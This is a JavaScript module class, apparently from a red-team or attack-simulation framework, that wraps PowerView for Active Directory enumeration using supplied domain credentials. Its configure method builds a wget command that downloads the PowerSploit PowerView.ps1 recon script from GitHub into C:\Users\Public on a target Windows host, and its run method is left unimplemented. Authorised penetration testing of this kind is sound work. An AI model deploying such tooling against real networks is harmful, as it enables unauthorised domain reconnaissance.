'use strict';

const WindowsModule = require('../base/rdhd-mod-base_windows_module');

// moduleCode: windows_powerview
class WindowsPowerView extends WindowsModule
{
    // ************************************************************
    //  PowerView module
    // ************************************************************
    // object      :   Object to enumerate 
    // target      :   Forest/Domain FQDN (if blank, current forest/domain)
    // username    :   Active Directory username
    // password    :   Active Directory password
    // ************************************************************

    constructor(asset, moduleCode, context, session, wsServer, token)
    {
        super(asset, moduleCode, session, wsServer, token);

        //  POST parameters
        // ******************************
        this.target = context.target;
        this.object = context.object;
        this.username = context.username;
        this.password = context.password;

        //  Local fields
        // ******************************
        this.powerview_path = "C:\\Users\\Public\\PowerView.ps1";
    }

    configure(whatIf = false)
    {
        let task = "wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 -OutFile '" + this.powerview_path + "';";

        //  Async execution
        // ******************************
        this.do(task, "cmd_res", false, whatIf);
    }

    run()
    {
        // Must be implemented in a derived class
        throw new Error("Not Implemented");
    }

    validate()
    {
        if (this.username && this.password && this.object && (!(this.target) || Validator.validateHostname(this.target)))
        {
            return true;
        }
        return false;
    }
}

module.exports = WindowsPowerView
